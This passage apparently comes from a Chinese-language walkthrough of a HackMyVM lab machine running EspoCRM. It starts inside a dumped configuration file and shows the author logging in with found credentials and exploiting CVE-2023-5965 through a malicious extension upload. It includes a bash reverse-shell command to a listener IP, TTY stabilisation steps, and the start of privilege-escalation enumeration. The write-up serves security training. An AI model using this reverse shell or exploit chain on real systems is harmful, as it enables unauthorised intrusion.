+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Contact<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Lead<span class="pl-pds">'</span></span>,
+    3 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Opportunity<span class="pl-pds">'</span></span>,
+    4 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Meeting<span class="pl-pds">'</span></span>,
+    5 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Call<span class="pl-pds">'</span></span>,
+    6 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Task<span class="pl-pds">'</span></span>,
+    7 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Case<span class="pl-pds">'</span></span>,
+    8 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Email<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>exportDisabled<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>adminNotifications<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>adminNotificationsNewVersion<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>adminNotificationsCronIsNotConfigured<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>adminNotificationsNewExtensionVersion<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>assignmentEmailNotifications<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>assignmentEmailNotificationsEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Lead<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Opportunity<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Task<span class="pl-pds">'</span></span>,
+    3 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Case<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>assignmentNotificationsEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Meeting<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Call<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Task<span class="pl-pds">'</span></span>,
+    3 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Email<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>portalStreamEmailNotifications<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>streamEmailNotificationsEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Case<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>streamEmailNotificationsTypeList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Post<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Status<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>EmailReceived<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>emailNotificationsDelay<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 30,
+  <span class="pl-s"><span class="pl-pds">'</span>emailMessageMaxSize<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 10,
+  <span class="pl-s"><span class="pl-pds">'</span>notificationsCheckInterval<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 10,
+  <span class="pl-s"><span class="pl-pds">'</span>maxEmailAccountCount<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 2,
+  <span class="pl-s"><span class="pl-pds">'</span>followCreatedEntities<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>b2cMode<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>theme<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Espo<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>themeParams<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> (object) [
+    <span class="pl-s"><span class="pl-pds">'</span>navbar<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>side<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>massEmailMaxPerHourCount<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 100,
+  <span class="pl-s"><span class="pl-pds">'</span>massEmailVerp<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>personalEmailMaxPortionSize<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 50,
+  <span class="pl-s"><span class="pl-pds">'</span>inboundEmailMaxPortionSize<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 50,
+  <span class="pl-s"><span class="pl-pds">'</span>emailAddressLookupEntityTypeList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>User<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Contact<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Lead<span class="pl-pds">'</span></span>,
+    3 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Account<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>authTokenLifetime<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 0,
+  <span class="pl-s"><span class="pl-pds">'</span>authTokenMaxIdleTime<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 48,
+  <span class="pl-s"><span class="pl-pds">'</span>userNameRegularExpression<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>[^a-z0-9\\-@_\\.\\s]<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>addressFormat<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 1,
+  <span class="pl-s"><span class="pl-pds">'</span>displayListViewRecordCount<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> true,
+  <span class="pl-s"><span class="pl-pds">'</span>dashboardLayout<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> (object) [
+      <span class="pl-s"><span class="pl-pds">'</span>name<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>My Espo<span class="pl-pds">'</span></span>,
+      <span class="pl-s"><span class="pl-pds">'</span>layout<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+        0 <span class="pl-k">=&gt;</span> (object) [
+          <span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>default-activities<span class="pl-pds">'</span></span>,
+          <span class="pl-s"><span class="pl-pds">'</span>name<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Activities<span class="pl-pds">'</span></span>,
+          <span class="pl-s"><span class="pl-pds">'</span>x<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 2,
+          <span class="pl-s"><span class="pl-pds">'</span>y<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 2,
+          <span class="pl-s"><span class="pl-pds">'</span>width<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 2,
+          <span class="pl-s"><span class="pl-pds">'</span>height<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 4
+        ],
+        1 <span class="pl-k">=&gt;</span> (object) [
+          <span class="pl-s"><span class="pl-pds">'</span>id<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>default-stream<span class="pl-pds">'</span></span>,
+          <span class="pl-s"><span class="pl-pds">'</span>name<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Stream<span class="pl-pds">'</span></span>,
+          <span class="pl-s"><span class="pl-pds">'</span>x<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 0,
+          <span class="pl-s"><span class="pl-pds">'</span>y<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 0,
+          <span class="pl-s"><span class="pl-pds">'</span>width<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 2,
+          <span class="pl-s"><span class="pl-pds">'</span>height<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 4
+        ]
+      ]
+    ]
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>calendarEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Meeting<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Call<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Task<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>activitiesEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Meeting<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Call<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>historyEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Meeting<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Call<span class="pl-pds">'</span></span>,
+    2 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Email<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>busyRangesEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Meeting<span class="pl-pds">'</span></span>,
+    1 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Call<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>emailAutoReplySuppressPeriod<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>2 hours<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>emailAutoReplyLimit<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 5,
+  <span class="pl-s"><span class="pl-pds">'</span>cleanupJobPeriod<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>1 month<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>cleanupActionHistoryPeriod<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>15 days<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>cleanupAuthTokenPeriod<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>1 month<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>currencyFormat<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 2,
+  <span class="pl-s"><span class="pl-pds">'</span>currencyDecimalPlaces<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 2,
+  <span class="pl-s"><span class="pl-pds">'</span>aclAllowDeleteCreated<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>aclAllowDeleteCreatedThresholdPeriod<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>24 hours<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>attachmentUploadMaxSize<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 256,
+  <span class="pl-s"><span class="pl-pds">'</span>attachmentUploadChunkSize<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 4,
+  <span class="pl-s"><span class="pl-pds">'</span>inlineAttachmentUploadMaxSize<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 20,
+  <span class="pl-s"><span class="pl-pds">'</span>textFilterUseContainsForVarchar<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>tabColorsDisabled<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>massPrintPdfMaxCount<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 50,
+  <span class="pl-s"><span class="pl-pds">'</span>emailKeepParentTeamsEntityList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Case<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>streamEmailWithContentEntityTypeList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Case<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>recordListMaxSizeLimit<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 200,
+  <span class="pl-s"><span class="pl-pds">'</span>noteDeleteThresholdPeriod<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>1 month<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>noteEditThresholdPeriod<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>7 days<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>emailForceUseExternalClient<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>useWebSocket<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>auth2FAMethodList<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> [
+    0 <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Totp<span class="pl-pds">'</span></span>
+  ],
+  <span class="pl-s"><span class="pl-pds">'</span>personNameFormat<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>firstLast<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>newNotificationCountInTitle<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>pdfEngine<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>Tcpdf<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>smsProvider<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> NULL,
+  <span class="pl-s"><span class="pl-pds">'</span>defaultFileStorage<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>EspoUploadDir<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>ldapUserNameAttribute<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>sAMAccountName<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>ldapUserFirstNameAttribute<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>givenName<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>ldapUserLastNameAttribute<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>sn<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>ldapUserTitleAttribute<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>title<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>ldapUserEmailAddressAttribute<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>mail<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>ldapUserPhoneNumberAttribute<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>telephoneNumber<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>ldapUserObjectClass<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>person<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>ldapPortalUserLdapAuth<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> false,
+  <span class="pl-s"><span class="pl-pds">'</span>passwordGenerateLength<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 10,
+  <span class="pl-s"><span class="pl-pds">'</span>massActionIdleCountThreshold<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 100,
+  <span class="pl-s"><span class="pl-pds">'</span>exportIdleCountThreshold<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 1000,
+  <span class="pl-s"><span class="pl-pds">'</span>cacheTimestamp<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 1701712486,
+  <span class="pl-s"><span class="pl-pds">'</span>microtime<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 1701712486.097623,
+  <span class="pl-s"><span class="pl-pds">'</span>siteUrl<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>http://espo.hmv<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>fullTextSearchMinLength<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 4,
+  <span class="pl-s"><span class="pl-pds">'</span>appTimestamp<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> 1701712486,
+  <span class="pl-s"><span class="pl-pds">'</span>maintenanceMode<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> NULL,
+  <span class="pl-s"><span class="pl-pds">'</span>cronDisabled<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> NULL
+]<span class="pl-k">;</span>
+                                                    </pre></div>
+<p>在data文件夹中发现了配置文件，并且配置文件中有账号和密码，我们尝试登录</p>
+<p>成功进入<code class="notranslate">EspoCRM</code>,查看一下他版本信息</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22"><img src="https://github.com/user-attachments/assets/8f423202-8c7b-46e8-b510-c04bb6db8c22" alt="image" style="max-width: 100%;"></a></p>
+<p>搜索该版本有没有漏洞。通过搜索发现存在<a href="https://github.com/josemlwdf/CVE-2023-5965">上传文件漏洞</a>，我们利用一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ git clone https://github.com/josemlwdf/CVE-2023-5965.git  
+正克隆到 <span class="pl-s"><span class="pl-pds">'</span>CVE-2023-5965<span class="pl-pds">'</span></span>...
+remote: Enumerating objects: 37, done.
+remote: Counting objects: 100% (37/37), done.
+remote: Compressing objects: 100% (34/34), done.
+remote: Total 37 (delta 14), reused 0 (delta 0), pack-reused 0 (from 0)
+接收对象中: 100% (37/37), 12.33 KiB <span class="pl-k">|</span> 287.00 KiB/s, 完成.
+处理 delta 中: 100% (14/14), 完成.
+                                             </pre></div>
+<p>发现第一个通过更新无效，尝试第二个上传插件，成功上传并有反馈</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201"><img src="https://github.com/user-attachments/assets/071ec117-95b6-4961-9461-a3d6149fb201" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1"><img src="https://github.com/user-attachments/assets/38120df0-907d-49a6-a5b0-fbf11a575ed1" alt="image" style="max-width: 100%;"></a></p>
+<p>弹一个反弹shell回来</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 执行语句</span>
+bash -c <span class="pl-s"><span class="pl-pds">"</span>bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1<span class="pl-pds">"</span></span>
+
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888                        
+listening on [any] 8888 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 35578
+bash: cannot <span class="pl-c1">set</span> terminal process group (509): Inappropriate ioctl <span class="pl-k">for</span> device
+bash: no job control <span class="pl-k">in</span> this shell
+www-data@espo:<span class="pl-k">~</span>/html/public$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<hr>
+<h1>3. 获得稳定的 Shell</h1>
+<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<hr>
+<h1>4.提权</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@espo:<span class="pl-k">~</span>/html/public$ ls -la
+total 36
+drwxr-xr-x  5 www-data www-data 4096 Jan  8 06:52 <span class="pl-c1">.</span>
+drwxr-xr-x 12 www-data www-data 4096 Dec  4  2023 ..
+drwxr-xr-x  3 www-data www-data 4096 Dec  4  2023 api
+-rw-r--r--  1 www-data www-data 1689 Dec  4  2023 index.php
+drwxr-xr-x  5 www-data www-data 4096 Dec  4  2023 install
+-rw-r--r--  1 www-data www-data 1660 Dec  4  2023 oauth-callback.php
+drwxr-xr-x  2 www-data www-data 4096 Dec  4  2023 portal
+-rw-r--r--  1 www-data www-data   26 Dec  4  2023 robots.txt
+-rw-r--r--  1 www-data www-data  302 Jan  8 06:52 webshell.php
+www-data@espo:<span class="pl-k">~</span>/html/public$ <span class="pl-c1">cd</span> ..
+www-data@espo:<span class="pl-k">~</span>/html$ ls -la
+total 136
+drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 <span class="pl-c1">.</span>
+drwxr-xr-x  4 root     root      4096 Dec  4  2023 ..
+-rw-r--r--  1 www-data www-data  1153 Dec  4  2023 .htaccess
+drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 EspoCRM-7.2.4
+-rw-r--r--  1 www-data www-data 35819 Dec  4  2023 LICENSE.txt
+drwxr-xr-x  3 www-data www-data  4096 Dec  4  2023 application
+drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 bin
+-rw-r--r--  1 www-data www-data  1498 Dec  4  2023 bootstrap.php
+-rw-r--r--  1 www-data www-data  1543 Dec  4  2023 clear_cache.php
+drwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 client
+-rw-r--r--  1 www-data www-data  1536 Dec  4  2023 command.php
+-rw-r--r--  1 www-data www-data  1531 Dec  4  2023 cron.php
+drwxrwxr-x  3 www-data www-data  4096 Dec  4  2023 custom
+-rw-r--r--  1 www-data www-data  1535 Dec  4  2023 daemon.php
+drwxrwxr-x  7 www-data www-data  4096 Jan  8 06:52 data
+-rw-r--r--  1 www-data www-data  2812 Dec  4  2023 extension.php
+drwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 html
+-rw-r--r--  1 www-data www-data  3170 Dec  4  2023 index.php
+drwxr-xr-x  4 www-data www-data  4096 Dec  4  2023 install
+-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 preload.php
+drwxr-xr-x  5 www-data www-data  4096 Jan  8 06:52 public
+-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 rebuild.php
+-rw-r--r--  1 www-data www-data  3034 Dec  4  2023 upgrade.php
+drwxr-xr-x 39 www-data www-data  4096 Dec  4  2023 vendor
+-rw-r--r--  1 www-data www-data  2534 Dec  4  2023 web.config
+-rw-r--r--  1 www-data www-data  1541 Dec  4  2023 websocket.php
+www-data@espo:<span class="pl-k">~</span>/html$ <span class="pl-c1">cd</span> /home/
+www-data@espo:/home$ ls -al
+total 12
+drwxr-xr-x  3 root   root   4096 Jan 24  2024 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root   root   4096 Dec  4  2023 ..
+drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 mandie
+www-data@espo:/home$ <span class="pl-c1">cd</span> mandie/
+www-data@espo:/home/mandie$ ls -al
+total 48
+drwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 <span class="pl-c1">.</span>
+drwxr-xr-x  3 root   root   4096 Jan 24  2024 ..
+lrwxrwxrwx  1 root   root      9 Jan 26  2024 .bash_history -<span class="pl-k">&gt;</span> /dev/null
+-rw-r--r--  1 mandie mandie  220 Dec  4  2023 .bash_logout
+-rw-r--r--  1 mandie mandie 3526 Dec  4  2023 .bashrc
+drwxr-xr-x  3 mandie mandie 4096 Dec  4  2023 .local
+drwxr-xr-x 12 mandie mandie 4096 Dec  4  2023 .oh-my-zsh
+-rw-r--r--  1 mandie mandie  807 Dec  4  2023 .profile
+-rw-r--r--  1 mandie mandie 3890 Dec  4  2023 .zshrc
+-rwxr-xr--  1 mandie mandie  493 Dec  4  2023 copyPics
+drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 pictures
+-rwx------  1 mandie mandie   33 Jan 24  2024 user.txt
+drwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 videos
+www-data@espo:/home/mandie$ <span class="pl-c1">cd</span> copyPics 
+bash: cd: copyPics: Not a directory
+www-data@espo:/home/mandie$ cat copyPics 
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+SOURCE_MEDIAS=<span class="pl-s"><span class="pl-pds">"</span>/var/shared_medias<span class="pl-pds">"</span></span>
+PICTURES_DIR=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span>/pictures<span class="pl-pds">"</span></span>
+VIDEOS_DIR=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span>/videos<span class="pl-pds">"</span></span>
+
+/usr/bin/find <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$SOURCE_MEDIAS</span><span class="pl-pds">"</span></span> <span class="pl-k">!</span> -executable -exec /usr/bin/cp {} <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$HOME</span><span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null <span class="pl-cce">\;</span>
+mkdir -p <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$PICTURES_DIR</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$VIDEOS_DIR</span><span class="pl-pds">"</span></span>
+
+<span class="pl-k">declare</span> -A directory_mappings
